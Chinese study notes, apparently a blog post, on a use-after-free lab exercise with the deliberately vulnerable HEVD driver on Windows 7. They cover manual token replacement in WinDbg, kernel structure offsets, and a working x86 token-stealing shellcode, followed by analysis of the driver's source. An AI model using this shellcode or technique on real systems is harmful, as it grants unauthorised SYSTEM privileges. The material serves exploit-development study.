# UAF漏洞（未开启NX）

## 提权示例

在Win7虚拟机中用普通用户打开一个cmd然后断下来，查看当前进程的信息

```
3: kd> !dml_proc
Address  PID  Image file name
86a157c8 4    System         
881a38d8 124  smss.exe       
882abc48 17c  csrss.exe      
892361d0 1b0  wininit.exe    
87dfbb60 1bc  csrss.exe      
88cdfa68 1f4  services.exe   
88cf23f0 214  winlogon.exe   
...... 
86b489b8 860  OSRLOADER.exe  
890d99e0 bcc  cmd.exe        
88e63030 d1c  conhost.exe    

```

可以看到System进程（pid为4）的地址是0x86a157c8，cmd的地址是0x890d99e0，查看地址中的成员信息。注意token的位置是在进程偏移0xf8的位置（这个数据结构在ntdll.dll里面应该能找到）。我们将进程的token修改为系统的token，就可以提权成功。

```
3: kd> dt nt!_EX_FAST_REF 86a157c8+f8 
   +0x000 Object           : 0x8d401276 Void
   +0x000 RefCnt           : 0y110
   +0x000 Value            : 0x8d401276 // system token
3: kd> dt nt!_EX_FAST_REF 890d99e0+f8
   +0x000 Object           : 0x83b07562 Void
   +0x000 RefCnt           : 0y010
   +0x000 Value            : 0x83b07562 // cmd token

```

我们用ed命令修改cmd token的值为system token

```
3: kd> ed 890d99e0+f8 0x8d401276
3: kd> dt nt!_EX_FAST_REF 890d99e0+f8
   +0x000 Object           : 0x8d401276 Void
   +0x000 RefCnt           : 0y110
   +0x000 Value            : 0x8d401276
```

用whoami命令查看权限，发现已经变为系统权限。

![image-20200514192810869](C:\Users\liwc1\AppData\Roaming\Typora\typora-user-images\image-20200514192810869.png)

## 线程 & 进程的数据结构与提权shellcode

用windbg的dg指令查看段描述符：

```
3: kd> r fs
fs=00000030
3: kd> dg 30
                                  P Si Gr Pr Lo
Sel    Base     Limit     Type    l ze an es ng Flags
---- -------- -------- ---------- - -- -- -- -- --------
0030 8fd40000 00003748 Data RW Ac 0 Bg By P  Nl 00000493

```

所以ring0下FS指向的是0x8fd40000，而这个地址是什么呢，看一些KPCR结构的信息

```
3: kd> !pcr
KPCR for Processor 3 at 8fd40000:
    Major 1 Minor 1
	NtTib.ExceptionList: 8fd5c10c
	    NtTib.StackBase: 00000000
	   NtTib.StackLimit: 00000000
	 NtTib.SubSystemTib: 8fd43750
	      NtTib.Version: 000d0e69
	  NtTib.UserPointer: 00000008
	      NtTib.SelfTib: 00000000

	            SelfPcr: 8fd40000
	               Prcb: 8fd40120
	               Irql: 0000001f
	                IRR: 00000000
	                IDR: ffffffff
	      InterruptMode: 00000000
	                IDT: 8fd49020
	                GDT: 8fd48c20
	                TSS: 8fd43750

	      CurrentThread: 8fd45800
	         NextThread: 882a8020
	         IdleThread: 8fd45800

	          DpcQueue: 

```

KPCR结构体的结构如下

```
3: kd> dt nt!_KPCR
   +0x000 NtTib            : _NT_TIB
   +0x000 Used_ExceptionList : Ptr32 _EXCEPTION_REGISTRATION_RECORD
   +0x004 Used_StackBase   : Ptr32 Void
   +0x008 Spare2           : Ptr32 Void
   +0x00c TssCopy          : Ptr32 Void
   +0x010 ContextSwitches  : Uint4B
   +0x014 SetMemberCopy    : Uint4B
   +0x018 Used_Self        : Ptr32 Void
   +0x01c SelfPcr          : Ptr32 _KPCR
   +0x020 Prcb             : Ptr32 _KPRCB
   +0x024 Irql             : UChar
   +0x028 IRR              : Uint4B
   +0x02c IrrActive        : Uint4B
   +0x030 IDR              : Uint4B
   +0x034 KdVersionBlock   : Ptr32 Void
   +0x038 IDT              : Ptr32 _KIDTENTRY
   +0x03c GDT              : Ptr32 _KGDTENTRY
   +0x040 TSS              : Ptr32 _KTSS
   +0x044 MajorVersion     : Uint2B
   +0x046 MinorVersion     : Uint2B
   +0x048 SetMember        : Uint4B
   +0x04c StallScaleFactor : Uint4B
   +0x050 SpareUnused      : UChar
   +0x051 Number           : UChar
   +0x052 Spare0           : UChar
   +0x053 SecondLevelCacheAssociativity : UChar
   +0x054 VdmAlert         : Uint4B
   +0x058 KernelReserved   : [14] Uint4B
   +0x090 SecondLevelCacheSize : Uint4B
   +0x094 HalReserved      : [16] Uint4B
   +0x0d4 InterruptMode    : Uint4B
   +0x0d8 Spare1           : UChar
   +0x0dc KernelReserved2  : [17] Uint4B
   +0x120 PrcbData         : _KPRCB

```

因为Windows需要支持多个CPU，因此Windows内核中为此定义了一套处理器控制区（Processor Control Region），即KPCR为枢纽的数据结构，使每个CPU都有个KPCR。其中KPCR这个结构有一个field KPCRB（Kernel Processor Control Block）结构，这个结构扩展了KPCR，这两个结构用来保存与线程切换相关的全局信息。

再看一下KPRCB的内容

```
3: kd> dt nt!_KPRCB
   +0x000 MinorVersion     : Uint2B
   +0x002 MajorVersion     : Uint2B
   +0x004 CurrentThread    : Ptr32 _KTHREAD
   +0x008 NextThread       : Ptr32 _KTHREAD
   +0x00c IdleThread       : Ptr32 _KTHREAD
   ......	
```

所以fs:[124h]即指向`_KTHREAD`类型的CurrentThread变量，结合WRK代码在/base/ntos/inc/i386.h下也可以找到`_KPCR`和`_KPRCB`的代码。

再看一下`_KTHREAD`结构:

```
3: kd> dx -id 0,0,ffffffff86a157c8 -r1 ((ntkrpamp!_KTHREAD *)0x8fd45800)
((ntkrpamp!_KTHREAD *)0x8fd45800)                 : 0x8fd45800 [Type: _KTHREAD *]
    [+0x000] Header           [Type: _DISPATCHER_HEADER]
    [+0x010] CycleTime        : 0x683c543bb7a [Type: unsigned __int64]
    [+0x018] HighCycleTime    : 0x683 [Type: unsigned long]
    [+0x020] QuantumTarget    : 0x15accf23bc [Type: unsigned __int64]
    [+0x028] InitialStack     : 0x8fd5ced0 [Type: void *]
    [+0x02c] StackLimit       : 0x8fd5a000 [Type: void *]
    [+0x030] KernelStack      : 0x8fd5cc1c [Type: void *]
    [+0x034] ThreadLock       : 0x0 [Type: unsigned long]
    [+0x038] WaitRegister     [Type: _KWAIT_STATUS_REGISTER]
    [+0x039] Running          : 0x1 [Type: unsigned char]
    [+0x03a] Alerted          [Type: unsigned char [2]]
    [+0x03c ( 0: 0)] KernelStackResident : 0x1 [Type: unsigned long]
    [+0x03c ( 1: 1)] ReadyTransition  : 0x0 [Type: unsigned long]
    [+0x03c ( 2: 2)] ProcessReadyQueue : 0x0 [Type: unsigned long]
    [+0x03c ( 3: 3)] WaitNext         : 0x0 [Type: unsigned long]
    [+0x03c ( 4: 4)] SystemAffinityActive : 0x0 [Type: unsigned long]
    [+0x03c ( 5: 5)] Alertable        : 0x0 [Type: unsigned long]
    [+0x03c ( 6: 6)] GdiFlushActive   : 0x0 [Type: unsigned long]
    [+0x03c ( 7: 7)] UserStackWalkActive : 0x0 [Type: unsigned long]
    [+0x03c ( 8: 8)] ApcInterruptRequest : 0x0 [Type: unsigned long]
    [+0x03c ( 9: 9)] ForceDeferSchedule : 0x0 [Type: unsigned long]
    [+0x03c (10:10)] QuantumEndMigrate : 0x0 [Type: unsigned long]
    [+0x03c (11:11)] UmsDirectedSwitchEnable : 0x0 [Type: unsigned long]
    [+0x03c (12:12)] TimerActive      : 0x0 [Type: unsigned long]
    [+0x03c (13:13)] SystemThread     : 0x1 [Type: unsigned long]
    [+0x03c (31:14)] Reserved         : 0x0 [Type: unsigned long]
    [+0x03c] MiscFlags        : 8193 [Type: long]
    [+0x040] ApcState         [Type: _KAPC_STATE]
3: kd> dx -id 0,0,ffffffff86a157c8 -r1 (*((ntkrpamp!_KAPC_STATE *)0x8fd45840))
(*((ntkrpamp!_KAPC_STATE *)0x8fd45840))                 [Type: _KAPC_STATE]
    [+0x000] ApcListHead      [Type: _LIST_ENTRY [2]]
    [+0x010] Process          : 0x86a157c8 [Type: _KPROCESS *]
    [+0x014] KernelApcInProgress : 0x0 [Type: unsigned char]
    [+0x015] KernelApcPending : 0x0 [Type: unsigned char]
    [+0x016] UserApcPending   : 0x0 [Type: unsigned char]

```

所以0x40+0x10=0x50处是`_KPROCESS`类型的成员变量Process，而实际上`_KPROCESS`是嵌套在`EPROCESS`结构体中的，查询WRK代码可知，`_EPROCESS`结构体的偏移0x00处为`KPROCESS`类型的pcb（进程控制块），所以`_KTHREAD`的0x50偏移处为对应的`_EPROCESS`结构体，而这个结构体中还存储了进程的uid。

```c++
// Process structure.
//
// If you remove a field from this structure, please also
// remove the reference to it from within the kernel debugger
// (nt\private\sdktools\ntsd\ntkext.c)
//

typedef struct _EPROCESS {
    KPROCESS Pcb;

    //
    // Lock used to protect:
    // The list of threads in the process.
    // Process token.
    // Win32 process field.
    // Process and thread affinity setting.
    //

    EX_PUSH_LOCK ProcessLock;

    LARGE_INTEGER CreateTime;
    LARGE_INTEGER ExitTime;

    //
    // Structure to allow lock free cross process access to the process
    // handle table, process section and address space. Acquire rundown
    // protection with this if you do cross process handle table, process
    // section or address space references.
    //

    EX_RUNDOWN_REF RundownProtect;

    HANDLE UniqueProcessId;
    
	//
    // Global list of all processes in the system. Processes are removed
    // from this list in the object deletion routine.  References to
    // processes in this list must be done with ObReferenceObjectSafe
    // because of this.
    //

    LIST_ENTRY ActiveProcessLinks; //此链表是存储系统中所有进程的全局链表
```

windbg调试`_EPROCESS`结构体如下：

```
3: kd> dx -id 0,0,ffffffff86a157c8 -r1 ((ntkrpamp!_EPROCESS *)0x86a157c8)
((ntkrpamp!_EPROCESS *)0x86a157c8)                 : 0x86a157c8 [Type: _EPROCESS *]
    [+0x000] Pcb              [Type: _KPROCESS]
    [+0x098] ProcessLock      [Type: _EX_PUSH_LOCK]
    [+0x0a0] CreateTime       : {132339167456696196} [Type: _LARGE_INTEGER]
    [+0x0a8] ExitTime         : {0} [Type: _LARGE_INTEGER]
    [+0x0b0] RundownProtect   [Type: _EX_RUNDOWN_REF]
    [+0x0b4] UniqueProcessId  : 0x4 [Type: void *] // System进程的uid为0x4
    [+0x0b8] ActiveProcessLinks [Type: _LIST_ENTRY] 

```

这里的`ActiveProcessLinks`如前述WRK代码所说，是系统内所有进程的全局列表，调试可知:

```
3: kd> dx -id 0,0,ffffffff86a157c8 -r1 (*((ntkrpamp!_LIST_ENTRY *)0x86a15880))
(*((ntkrpamp!_LIST_ENTRY *)0x86a15880))                 [Type: _LIST_ENTRY]
    [+0x000] Flink            : 0x881a3990 [Type: _LIST_ENTRY *]
    [+0x004] Blink            : 0x83f89f18 [Type: _LIST_ENTRY *]

```

此双向链表指向的前一个进程的`_LIST_ENTRY`地址为0x881a3990，而这个进程的uid为124，即为`smss.exe `

```
3: kd> dt nt!_EPROCESS 0x881a3990-0xb8
   +0x000 Pcb              : _KPROCESS
   +0x098 ProcessLock      : _EX_PUSH_LOCK
   +0x0a0 CreateTime       : _LARGE_INTEGER 0x01d629c5`8a27bba5
   +0x0a8 ExitTime         : _LARGE_INTEGER 0x0
   +0x0b0 RundownProtect   : _EX_RUNDOWN_REF
   +0x0b4 UniqueProcessId  : 0x00000124 Void
   +0x0b8 ActiveProcessLinks : _LIST_ENTRY [ 0x882abd00 - 0x86a15880 ]

```

所以，我们可以写出遍历ActiveProcessLinks链表找到System进程并复制token的shellcode如下:

```c++
void Shellcode()
{
	_asm
	{
		nop
		nop
		nop
		nop
		pushad
		mov eax,fs:[124h]		// 找到当前线程的_KTHREAD结构
		mov eax, [eax + 0x50] 	// 找到_PROCESS&_EPROCESS结构
		mov ecx, eax 			// ecx为当前线程
		mov edx, 4

		// 循环获取system的_EPROCESS
	find_sys_pid:
		mov eax, [eax+0xb8]		// 找到ActiveProcessLinks
		sub eax, 0xb8			// FLINK
		cmp [eax + 0xb4], edx	// 与uid = 4比较
		jnz find_sys_pid

		// 替换Token
		mov edx, [eax+0xf8]
		mov [ecx + 0xf8], edx
		popad
		ret
	}
}
```

## 漏洞驱动代码分析

先看一下HEVD驱动代码的代码结构，其实这里UAF相关的有两个，一个是`UseAfterFreeNonPagedPool`，另一个是`UseAfterFreeNonPagedPoolNx`。这里实际上不是堆块，而是内存池。具体机制之后再学习。

### HackSysExtremeVulnerableDriver.h

```c++
#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)
```

CTL_CODE这个宏定义在`Wdm.h`和`Ntddk.h`中，是为了定义新的IO控制代码，我们一般会如上，再次封装。在WRK中这个宏的源码如下：

```c++
//
// Macro definition for defining IOCTL and FSCTL function control codes.  Note
// that function codes 0-2047 are reserved for Microsoft Corporation, and
// 2048-4095 are reserved for customers.
//

#define CTL_CODE( DeviceType, Function, Method, Access ) (                 \
    ((DeviceType) << 16) | ((Access) << 14) | ((Function) << 2) | (Method) \
)
```

i/o控制代码的布局图如下:

![说明 i/o 控制代码布局的关系图](https://docs.microsoft.com/zh-cn/windows-hardware/drivers/kernel/images/ioctl-1.png)

>- 如果一个IOCTLs可用于用户态软件组件，IOCTL必须与IRP_MJ_DEVICE_CONTROL请求一起使用，用户态的组件通过调用Win32函数`DeviceIoControl`发送`IRP_MJ_DEVICE_CONTROL`请求
>- 如果一个IOCTLs只能用于内核态驱动组件，IOCTL必须与IRP_MJ_INTERNAL_DEVICE_CONTROL请求一起使用。kernel态组件通过`IoBuildDeviceIoControlRequest`请求创建`IRP_MJ_INTERNAL_DEVICE_CONTROL`请求。（https://docs.microsoft.com/zh-cn/windows-hardware/drivers/kernel/creating-ioctl-requests-in-drivers）

然后定义了一系列的IOCTL：

```c++
//
// IOCTL Definitions
//

#define HEVD_IOCTL_BUFFER_OVERFLOW_STACK                         IOCTL(0x800)
#define HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS                      IOCTL(0x801)
#define HEVD_IOCTL_ARBITRARY_WRITE                               IOCTL(0x802)
#define HEVD_IOCTL_BUFFER_OVERFLOW_NON_PAGED_POOL                IOCTL(0x803)
#define HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL            IOCTL(0x804)
#define HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL                 IOCTL(0x805)
#define HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL                IOCTL(0x806)
#define HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL           IOCTL(0x807)
#define HEVD_IOCTL_TYPE_CONFUSION                                IOCTL(0x808)
#define HEVD_IOCTL_INTEGER_OVERFLOW                              IOCTL(0x809)
#define HEVD_IOCTL_NULL_POINTER_DEREFERENCE                      IOCTL(0x80A)
#define HEVD_IOCTL_UNINITIALIZED_MEMORY_STACK                    IOCTL(0x80B)
#define HEVD_IOCTL_UNINITIALIZED_MEMORY_PAGED_POOL               IOCTL(0x80C)
#define HEVD_IOCTL_DOUBLE_FETCH                                  IOCTL(0x80D)
#define HEVD_IOCTL_INSECURE_KERNEL_FILE_ACCESS                   IOCTL(0x80E)
#define HEVD_IOCTL_MEMORY_DISCLOSURE_NON_PAGED_POOL              IOCTL(0x80F)
#define HEVD_IOCTL_BUFFER_OVERFLOW_PAGED_POOL_SESSION            IOCTL(0x810)
#define HEVD_IOCTL_WRITE_NULL                                    IOCTL(0x811)
#define HEVD_IOCTL_BUFFER_OVERFLOW_NON_PAGED_POOL_NX             IOCTL(0x812)
#define HEVD_IOCTL_MEMORY_DISCLOSURE_NON_PAGED_POOL_NX           IOCTL(0x813)
#define HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL_NX         IOCTL(0x814)
#define HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL_NX              IOCTL(0x815)
#define HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL_NX             IOCTL(0x816)
#define HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL_NX        IOCTL(0x817)
#define HEVD_IOCTL_CREATE_ARW_HELPER_OBJECT_NON_PAGED_POOL_NX    IOCTL(0x818)
#define HEVD_IOCTL_SET_ARW_HELPER_OBJECT_NAME_NON_PAGED_POOL_NX  IOCTL(0x819)
#define HEVD_IOCTL_GET_ARW_HELPER_OBJECT_NAME_NON_PAGED_POOL_NX  IOCTL(0x81A)
#define HEVD_IOCTL_DELETE_ARW_HELPER_OBJECT_NON_PAGED_POOL_NX    IOCTL(0x81B)
```

然后为两个回调函数提供声明，

```
DRIVER_INITIALIZE DriverEntry;
DRIVER_UNLOAD     DriverUnloadHandler;
```

**其中`DriverEntry`是所有驱动程序的入口点，就像Main()适用于许多用户态APP一样。`DriverEntry`的任务是初始化驱动程序范围的结构和资源，一般会创建驱动程序对象，这个对象充当你在驱动程序中创建的所有其他框架对象的父对象，这些框架包括设备对象、I/O队列、计时器、旋转锁等。基于框架的驱动程序不会直接访问框架对象，而是通过句柄(handles)来引用对象，驱动程序将该对象作为输入传递给对象方法。框架对象的特征有：引用计数、上下文空间、删除回调函数、父对象。**

**`DRIVER_UNLOAD`函数会在系统卸载驱动之前执行。对于WDM驱动是必需的，对于非WDM的驱动是可选的。DriverEntry函数必须存储Unload函数的地址在`DriverObject->DriverUnload`中**

在WRK代码中，这些所谓的回调函数都是预留的函数指针，然后这些函数指针作为回调函数在相应位置被调用。

```c++
typedef
NTSTATUS
(*PDRIVER_INITIALIZE) (
    IN struct _DRIVER_OBJECT *DriverObject,
    IN PUNICODE_STRING RegistryPath
    );

//
// Define driver unload routine type.
//
typedef
VOID
(*PDRIVER_UNLOAD) (
    IN struct _DRIVER_OBJECT *DriverObject
    );
//
```

>驱动分为NT式驱动和WDM式驱动两种。
>
>对于NT式驱动来说，主要的函数时DriverEntry函数，卸载函数，以及各个IRP的派遣函数，不支持即插即用功能，要导入的头文件是ntddk.h。
>
>其入口函数DriverEntry主要进行初始化工作，驱动加载时，系统进程创建新的线程，调用对象管理器，创建驱动对象。
>
>```c++
>NTSTATUS IoCreateDevice(
>  _In_     PDRIVER_OBJECT  DriverObject,         //指向驱动对象的指针
>  _In_     ULONG           DeviceExtensionSize,  //设备扩展的大小
>  _In_opt_ PUNICODE_STRING DeviceName,           //设备对象名
>  _In_     DEVICE_TYPE     DeviceType,           //设备对象类型
>  _In_     ULONG           DeviceCharacteristics,//设备对象特征
>  _In_     BOOLEAN         Exclusive,            //是否在内核下使用
>  _Out_    PDEVICE_OBJECT  *DeviceObject         //返回设备对象地址
>);
>```
>
>对于WDM式驱动来说，它支持即插即用功能，要导入的头文件为wdm.h。
>
>这是Windows 2000后加入的新的驱动模型，比NT式驱动更加复杂，完成一个设备操作，至少要两个驱动设备共同完成，分别是物理设备对象（PDO）和功能设备对象（FDO），FDO会附加在PDO上。
>
>WDM的入口函数也是DriverEntry，但创建设备对象的责任交给了AddDevice函数，而且必须加载IRP_MJ_PNP派遣回调函数。
>
>在WDM中，大部分的卸载工作都不是由DriverUnload来处理，而是放在对IRP_MN_REMOVE_DEVICE的IRP的处理函数中处理。
>
>WDM式驱动不是按照服务来加载，安装WDM式驱动需要一个inf文件。inf文件描述了WDM驱动程序的操作硬件设备的信息和驱动程序的一些信息。
>
>**驱动程序是一个“回调集合”，经初始化后，会在系统有需要时等待系统调用。这可能是新设备到达事件、用户模式应用程序的I/O请求、系统电源关闭事件、另一个驱动程序的请求，或用户意外拔出设备时的意外删除事件。**

 然后是一些派遣回调函数的声明：

```c++
__drv_dispatchType(IRP_MJ_CREATE)
__drv_dispatchType(IRP_MJ_CLOSE)
DRIVER_DISPATCH IrpCreateCloseHandler;

__drv_dispatchType(IRP_MJ_DEVICE_CONTROL)
DRIVER_DISPATCH IrpDeviceIoCtlHandler;

__drv_dispatchType(IRP_MJ_CREATE)
__drv_dispatchType(IRP_MJ_CREATE_NAMED_PIPE)
DRIVER_DISPATCH IrpNotImplementedHandler;
```

`DRIVER_DISPATCH`这个派遣回调函数十分重要，是用来处理不同的IRP（IO请求包）。参数是相应的`_DEVICE_OBJECT`指针和`_IRP`指针。关键的是派遣回调函数的`remark`，所有派遣函数的输入参数都在IRP指针指向的结构中提供，而附加参数在驱动程序的相关I/O堆栈位置中提供，该位置由`IO_STACK_LOCATION`结构描述，并且可以通过调用`IoGetCurrentIrpStackLocation`获取。通常，所有派遣回调函数都在`IRQL=PASSIVE`级别的任意线程上下文中执行，但也有例外。

- 这里以声明的`IrpCreateCloseHandler`派遣回调函数为例，该函数有两个remark：`IRP_MJ_CREATE`和`IRP_MJ_CLOSE`。前者在新文件/目录创建或已存在的文件、设备、目录、volumn等被创建时由IO管理器发送，这一般是用户态的win32API（如CreateFile）或者kernel态的组件调用`IoCreateFile`、`IoCreateFileSpecifyDeviceObjectHint`、`ZwCreateFile`、`ZsOpenFile`等时被调用；后者表示此请求的回执指示已关闭并释放与目标设备对象相关联的文件对象的最后一个句柄，即 已完成或取消所有未完成的 I/O 请求。

>A driver can provide a single *DispatchCreateClose* routine instead of separate [DispatchCreate](https://msdn.microsoft.com/library/windows/hardware/ff543266) and [DispatchClose](https://docs.microsoft.com/windows-hardware/drivers/ddi/wdm/nc-wdm-driver_dispatch) routines.
>
>A driver's *DispatchCreateClose* routine should be named ***Xxx\*DispatchCreateClose**, where *Xxx* is a driver-specific prefix. The driver's [DriverEntry](https://docs.microsoft.com/windows-hardware/drivers/storage/driverentry-of-ide-controller-minidriver) routine must store the *DispatchCreateClose* routine's address in *DriverObject*->**MajorFunction**[IRP_MJ_CREATE] and in *DriverObject*->**MajorFunction**[IRP_MJ_CLOSE].

- 对于`IrpDeviceIoCtlHandler`这个派遣回调函数来说，IRP_MJ_DEVICE_CONTROL在一个用户态的app调用Win32API `DeviceIoControl`时或kernel态组件调用`ZwDeviceIoControlFile`时被调用。

- 对于`IrpNotImplementedHandler`这个派遣回调函数来说，`IRP_MJ_CREATE_NAMED_PIPE`在新的命名管道被创建时由IO管理器发送，一般是用户态的app调用win32API`CreateNamePipe`或者kernel态的组件调用`IoCreateFile`或`IoCreateFileSpecifyDeviceObjectHint`时被调用。

上述声明的定义：

```c++
NTSTATUS
DriverEntry(
    _In_ PDRIVER_OBJECT DriverObject,
    _In_ PUNICODE_STRING RegistryPath
);

VOID
DriverUnloadHandler(
    _In_ PDRIVER_OBJECT DriverObject
);

NTSTATUS
IrpCreateCloseHandler(
    _In_ PDEVICE_OBJECT DeviceObject,
    _In_ PIRP Irp
);

NTSTATUS
IrpDeviceIoCtlHandler(
    _In_ PDEVICE_OBJECT DeviceObject,
    _In_ PIRP Irp
);

NTSTATUS
IrpNotImplementedHandler(
    _In_ PDEVICE_OBJECT DeviceObject,
    _In_ PIRP Irp
);
```

至此，头文件的声明和定义结束。

### HackSysExtremeVulnerableDriver.c

首先是一些没见过的宏定义

```c++
#ifdef ALLOC_PRAGMA
#pragma alloc_text(INIT, DriverEntry)
#pragma alloc_text(PAGE, DriverUnloadHandler)
#pragma alloc_text(PAGE, IrpCreateCloseHandler)
#pragma alloc_text(PAGE, IrpDeviceIoCtlHandler)
#pragma alloc_text(PAGE, IrpNotImplementedHandler)
#endif // ALLOC_PRAGMA
```

这里alloc_text是意思是让编译器将相应的函数分配到指定段。这里将DriverUnloadHandler、IrpCreateCloseHandler、IrpDeviceIoCtlHandler、IrpNotImplementedHandler分配到分页池中。（PAGE段）

然后是`DriverEntry`的函数体。

- 有一个`UNREFERENCED_PARAMETER(RegistryPath);`，这个API的意思是将不会引用的参数予以标记。
- 有`PAGED_CODE`的调用，这个宏确保调用方线程在足够低的允许分页的IRQL（管理硬件的优先级）上运行，如果IRQL>APC_LEVEL，则PAGED_CODE宏会导致系统ASSERT。

>默认的，链接器会将".text", ".data"等名字赋予驱动镜像文件的代码段和数据段，在驱动加载时，IO管理器会令这些段nonpaged。一个非分页的段通常是memory-resident的（内存驻留）。驱动的开发者可以选择令驱动的指令部分变得可分页，所以Windows可以将这些部分不使用时移动到paging file中，这些段以"PAGE"开头。

- ```
  RtlInitUnicodeString(&DeviceName, L"\\Device\\HackSysExtremeVulnerableDriver");
  RtlInitUnicodeString(&DosDeviceName, L"\\DosDevices\\HackSysExtremeVulnerableDriver");
  ```

  初始化两个Unicode字符串

- 然后用`IoCreateDevice`创建设备，如果失败则调用`IoDeleteDevice`删除。

  ```c++
   Status = IoCreateDevice(
          DriverObject, 				// 指向驱动对象的指针
          0,							// 驱动扩展size
          &DeviceName,				// NULL结尾的驱动名字字符串
          FILE_DEVICE_UNKNOWN,		// 驱动类型
          FILE_DEVICE_SECURE_OPEN,	// 驱动对象特征
          FALSE,						// 是否在内核下使用
          &DeviceObject				// 返回设备对象地址
      );
  
      if (!NT_SUCCESS(Status))
      {
          if (DeviceObject)
          {
              //
              // Delete the device
              //
  
              IoDeleteDevice(DeviceObject);
          }
  
          DbgPrint("[-] Error Initializing HackSys Extreme Vulnerable Driver\n");
          return Status;
      }
  
  ```

- 初始化IRP句柄：

  ```c++
  //
      // Assign the IRP handlers
      //
  
      for (i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++)
      {
          DriverObject->MajorFunction[i] = IrpNotImplementedHandler;
      }
  
      //
      // Assign the IRP handlers for Create, Close and Device Control
      //
  
      DriverObject->MajorFunction[IRP_MJ_CREATE] = IrpCreateCloseHandler;
      DriverObject->MajorFunction[IRP_MJ_CLOSE] = IrpCreateCloseHandler;
      DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IrpDeviceIoCtlHandler;
  
      //
      // Assign the driver Unload routine
      //
  
      DriverObject->DriverUnload = DriverUnloadHandler;
  ```

- 设置DriverObject的flag：

  ```c++
  	DeviceObject->Flags |= DO_DIRECT_IO;
      DeviceObject->Flags &= ~DO_DEVICE_INITIALIZING;
  ```

- 创建符号链接，创建一个设备对象名字和设备的用户变量名字之间的符号链接。

  ```c++
  Status = IoCreateSymbolicLink(&DosDeviceName, &DeviceName);
  ```

---

然后是`IrpCreateCloseHandler`的函数体，主要是调用了`IoCompleteRequest`宏，表示caller已经完成了对给定IO请求的处理并且返回给定的IRP到IO管理器。`IoCompleteRequest(Irp, IO_NO_INCREMENT);`，这里`IO_NO_INCREMENT`说明请求操作的原始线程的优先级不需要变化，这里是因为这个操作很快就会完成（IrpCreateCloseHandler中并没有实质性操作）或报错完成。

在`DriverUnloadHandler`的函数体中，调用`IoDeleteSymbolicLink`删除了符号链接，调用`IoDeleteDevice`删除了设备对象。

`IrpNotImplementedHandler`和`IrpCreateCloseHandler`的函数体相同，也是不做任何操作就直接complete。

最后是`IrpDeviceIoCtlHandler`，这个函数需要重点分析。

- `IrpSp = IoGetCurrentIrpStackLocation(Irp);` **这个函数返回指向caller的I/O堆栈位置在指定IRP中的指针。**每个驱动都必须以每个它发送的IRP调用`IoGetCurrentIrpStackLocation `，为了获取当前请求的参数。

>I/o 管理器为分层驱动程序链中的每个驱动程序提供它所设置的每个 IRP 的 i/o 堆栈位置。每个I/O堆栈位置都包含一个`IO_STACK_LOCATION`结构体。**这个结构体中最重要的就是`Parameters`。**I/O管理器为每个IRP创建一个I/O堆栈位置的数组，其中的数组元素对应于一系列分层驱动程序中的每个驱动程序。每个驱动拥有一个包中的堆栈位置，并且通过`IoGetCurrentIrpStackLocation `函数获取I/O操作的驱动相关消息。链中的每个驱动都可以通过调用`IoGetNextLrpStackLocation`来设置更低层的驱动的IO堆栈位置，任何高层驱动的I/O堆栈位置也能用来存储操作的上下文，因此驱动的`IoCompletion`函数可以完成清理操作。

- `IoControlCode = IrpSp->Parameters.DeviceIoControl.IoControlCode;`获取IO请求的控制代码

- 基于IO控制代码，有一系列switch case语句，首先打印一些调试信息，然后执行相应的句柄。

  ```c++
   if (IrpSp)
      {
          switch (IoControlCode)
          {
          ...
  		case HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL:
              DbgPrint("****** HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL ******\n");
              Status = AllocateUaFObjectNonPagedPoolIoctlHandler(Irp, IrpSp);
              DbgPrint("****** HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL ******\n");
              break;
          case HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL:
              DbgPrint("****** HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL ******\n");
              Status = UseUaFObjectNonPagedPoolIoctlHandler(Irp, IrpSp);
              DbgPrint("****** HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL ******\n");
              break;
          case HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL:
              DbgPrint("****** HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL ******\n");
              Status = FreeUaFObjectNonPagedPoolIoctlHandler(Irp, IrpSp);
              DbgPrint("****** HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL ******\n");
              break;
          case HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL:
              DbgPrint("****** HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL ******\n");
              Status = AllocateFakeObjectNonPagedPoolIoctlHandler(Irp, IrpSp);
              DbgPrint("****** HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL ******\n");
              break;
     		...
          default:
              DbgPrint("[-] Invalid IOCTL Code: 0x%X\n", IoControlCode);
              Status = STATUS_INVALID_DEVICE_REQUEST;
              break;
          }
      }
  ```

- 最后更新IoStatus信息和完成请求

  ```c++
  	//
      // Update the IoStatus information
      //
  	Irp->IoStatus.Status = Status;
      Irp->IoStatus.Information = 0;
  
      //
      // Complete the request
      //
  
      IoCompleteRequest(Irp, IO_NO_INCREMENT);
  ```

### Common.h

设置了一些宏定义和一个void类型的函数指针`FunctionPointer`

```c++
#define POOL_TAG 'kcaH'
#define BUFFER_SIZE 512

#define _STRINGIFY(value) #value
#define STRINGIFY(value) _STRINGIFY(value)

#define DbgPrint(Format, ...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, Format, __VA_ARGS__)

typedef void (*FunctionPointer)(void);

```

